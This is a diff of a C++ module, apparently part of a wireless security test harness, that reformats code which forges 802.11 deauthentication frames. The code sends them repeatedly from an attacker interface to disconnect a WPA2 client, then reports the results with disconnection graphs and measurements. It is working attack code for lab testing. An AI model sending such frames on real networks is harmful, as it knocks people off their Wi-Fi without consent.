@@ -25,60 +25,60 @@ using namespace chrono;
 // The AP will process or forward in a way that breaks the SA Query exchange
 // patched hostapd (>= 2.10) silently drops frames where SA == own_addr before processing.
 static RadioTap make_deauth(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
-    Dot11Deauthentication frame(sta_mac, ap_mac);
-    frame.addr3(ap_mac);  // BSSID
-    frame.reason_code(7); // CLASS3_FRAME_FROM_NONASSOC_STA - required by sme_event_unprot_disconnect
+	Dot11Deauthentication frame(sta_mac, ap_mac);
+	frame.addr3(ap_mac);  // BSSID
+	frame.reason_code(7); // CLASS3_FRAME_FROM_NONASSOC_STA - required by sme_event_unprot_disconnect
 
-    RadioTap rt{};
-    rt.inner_pdu(frame);
-    return rt;
+	RadioTap rt{};
+	rt.inner_pdu(frame);
+	return rt;
 }
 
 void setup_attack(RunStatus &rs) {
-    // WPA2-PSK does not emit EAPOL-4WAY-HS-COMPLETED; use AP-STA-CONNECTED instead
-    components::client_ap_setup(rs, false);
+	// WPA2-PSK does not emit EAPOL-4WAY-HS-COMPLETED; use AP-STA-CONNECTED instead
+	components::client_ap_setup(rs, false);
 }
 
 void run_attack(RunStatus &rs) {
-    const auto &att_cfg = rs.config().at("attack_config");
-    rs.start_observers();
+	const auto &att_cfg = rs.config().at("attack_config");
+	rs.start_observers();
 
-    const HWAddress<6> ap_mac(rs.get_actor("ap").get(SK::mac));
-    const HWAddress<6> sta_mac(rs.get_actor("client").get(SK::mac));
-    const string iface = rs.get_actor("attacker").get(SK::iface);
+	const HWAddress<6> ap_mac(rs.get_actor("ap").get(SK::mac));
+	const HWAddress<6> sta_mac(rs.get_actor("client").get(SK::mac));
+	const string iface = rs.get_actor("attacker").get(SK::iface);
 
-    interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
+	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
 
-    log(LogLevel::INFO, "Deauth attack START");
-    PacketSender sender{iface};
-    RadioTap frame = make_deauth(ap_mac, sta_mac);
-    const auto end = steady_clock::now() + seconds(att_cfg.at("attack_time"));
-    while (steady_clock::now() < end) {
-        sender.send(frame);
-        interruptible_sleep(milliseconds(att_cfg.at("ms_interval")));
-    }
-    log(LogLevel::INFO, "Deauth attack END");
+	log(LogLevel::INFO, "Deauth attack START");
+	PacketSender sender{ iface };
+	RadioTap frame = make_deauth(ap_mac, sta_mac);
+	const auto end = steady_clock::now() + seconds(att_cfg.at("attack_time"));
+	while(steady_clock::now() < end) {
+		sender.send(frame);
+		interruptible_sleep(milliseconds(att_cfg.at("ms_interval")));
+	}
+	log(LogLevel::INFO, "Deauth attack END");
 
-    interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
-    rs.process_manager.stop_all();
+	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
+	rs.process_manager.stop_all();
 }
 
 void generate_report(const RunStatus &rs) {
 	vector<unique_ptr<GraphElements>> elements;
-	rs.log_events(elements, {DISCONNECT, CONNECT, TESTER_TAGS});
+	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });
 
 	const path sta_graph = observer::tshark::tshark_graph(rs, "client", elements);
-	const path ap_graph  = observer::tshark::tshark_graph(rs, "ap", elements);
+	const path ap_graph = observer::tshark::tshark_graph(rs, "ap", elements);
 
 	report::ReportGuard report(rs.run_folder());
-	if (report) {
+	if(report) {
 		report << "# Deauth DoS Attack (WPA2)\n\n";
 		report::attack_mapping_table(report, rs);
-		if (!sta_graph.empty()) {
+		if(!sta_graph.empty()) {
 			report << "### STA (wpa_supplicant " << hostapd::get_version(rs, "client") << ")\n";
 			report << "![STA Graph](" << sta_graph << ")\n\n";
 		}
-		if (!ap_graph.empty()) {
+		if(!ap_graph.empty()) {
 			report << "### AP (hostapd " << hostapd::get_version(rs, "ap") << ")\n";
 			report << "![AP Graph](" << ap_graph << ")\n\n";
 		}
@@ -90,20 +90,20 @@ void stats_attack(const RunStatus &rs) {
 
 	generate_report(rs);
 
-    nlohmann::json result; // TODO přesunout do parse funkce Entry?
-    const auto window = visual::helper::get_run_window(rs);
-    result["client_disconnected"] = visual::helper::get_client_disconnected(rs, window);
-    // AP-STA-DISCONNECTED fires if AP properly deauths client; INTERFACE-DISABLED fires if
-    // the deauth SA==own_addr bug causes nl80211 to bring the AP interface down entirely
-    result["ap_disconnected"] = !get_time_logs(rs, "ap", "AP-STA-DISCONNECTED", window).empty();
-    result["client_mfp"]          = visual::helper::get_client_mfp(rs, window);
-    result["ap_WPA_support"]      = visual::helper::get_ap_WPA_support(rs);
-    result["client_WPA_support"]  = visual::helper::get_client_WPA_support(rs, window);
+	nlohmann::json result; // TODO přesunout do parse funkce Entry?
+	const auto window = visual::helper::get_run_window(rs);
+	result["client_disconnected"] = visual::helper::get_client_disconnected(rs, window);
+	// AP-STA-DISCONNECTED fires if AP properly deauths client; INTERFACE-DISABLED fires if
+	// the deauth SA==own_addr bug causes nl80211 to bring the AP interface down entirely
+	result["ap_disconnected"] = !get_time_logs(rs, "ap", "AP-STA-DISCONNECTED", window).empty();
+	result["client_mfp"] = visual::helper::get_client_mfp(rs, window);
+	result["ap_WPA_support"] = visual::helper::get_ap_WPA_support(rs);
+	result["client_WPA_support"] = visual::helper::get_client_WPA_support(rs, window);
 
-    const TimeWindow w_start{LogTimePoint{}, get_tag_time(rs.combined_log(), START_tag)};
-    result["conn_WPA_version"] = visual::helper::get_conn_WPA_version(rs, w_start);
+	const TimeWindow w_start{ LogTimePoint{}, get_tag_time(rs.combined_log(), START_tag) };
+	result["conn_WPA_version"] = visual::helper::get_conn_WPA_version(rs, w_start);
 
-    rs.save_result(result);
+	rs.save_result(result);
 }
 
 }
